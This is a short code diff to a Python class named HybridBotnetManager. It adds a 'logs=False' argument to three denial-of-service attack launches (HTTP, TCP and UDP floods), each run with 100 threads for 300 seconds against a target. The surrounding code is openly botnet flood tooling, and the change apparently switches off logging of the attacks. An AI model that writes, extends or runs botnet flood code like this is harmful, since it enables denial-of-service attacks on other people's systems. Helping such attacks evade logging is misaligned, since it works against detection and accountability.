@@ -506,7 +506,8 @@ class HybridBotnetManager:
                     u=target,
                     threads=100,
                     timeout=5,
-                    duration=300
+                    duration=300,
+                    logs=False
                 )
                 attacker.start()
                 print(f"🚀 HTTP flood attack started on {target}")
@@ -527,7 +528,8 @@ class HybridBotnetManager:
                     p=port,
                     threads=100,
                     timeout=5,
-                    duration=300
+                    duration=300,
+                    logs=False
                 )
                 attacker.start()
                 print(f"🚀 TCP flood attack started on {target}")
@@ -548,7 +550,8 @@ class HybridBotnetManager:
                     u=host,
                     p=port,
                     threads=100,
-                    duration=300
+                    duration=300,
+                    logs=False
                 )
                 attacker.start()
                 print(f"🚀 UDP flood attack started on {target}")
